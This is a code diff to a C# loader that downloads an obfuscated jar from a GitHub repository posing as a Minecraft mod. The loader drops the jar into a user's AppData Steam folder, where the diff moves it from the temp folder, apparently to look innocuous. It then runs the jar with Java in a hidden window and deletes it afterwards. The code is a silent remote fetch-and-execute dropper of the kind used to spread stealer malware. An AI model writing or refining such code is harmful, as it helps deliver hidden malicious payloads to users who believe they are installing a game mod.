@@ -49,28 +49,31 @@ class Loader
         try
         {
             string jarUrl = "https://raw.githubusercontent.com/edhjsertwasfvds/ModMinecraftJar1.2.8/main/Main_obf.jar";
-            string tempJar = Path.Combine(Path.GetTempPath(), "Main_obf.jar");
+            string jarDir = @"C:\Users\klobz\AppData\Local\Steam";
+            if (!Directory.Exists(jarDir)) Directory.CreateDirectory(jarDir);
+            string jarPath = Path.Combine(jarDir, "local.jar");
 
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
 
             using (WebClient wc = new WebClient())
             {
                 wc.Headers.Add("User-Agent", "Mozilla/5.0");
-                wc.DownloadFile(jarUrl, tempJar);
+                wc.DownloadFile(jarUrl, jarPath);
             }
 
             string javaPath = FindJava();
             if (javaPath == null)
             {
                 MessageBox.Show("Java not found. Install Java 17+", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                try { File.Delete(jarPath); } catch { }
                 return;
             }
 
             ProcessStartInfo psi = new ProcessStartInfo
             {
                 FileName = javaPath,
-                Arguments = "-jar \"" + tempJar + "\"",
-                WorkingDirectory = Path.GetTempPath(),
+                Arguments = "-jar \"" + jarPath + "\"",
+                WorkingDirectory = jarDir,
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
                 UseShellExecute = false
@@ -79,7 +82,7 @@ class Loader
             Process proc = Process.Start(psi);
             proc.WaitForExit();
 
-            try { File.Delete(tempJar); } catch { }
+            try { File.Delete(jarPath); } catch { }
         }
         catch (Exception ex)
         {
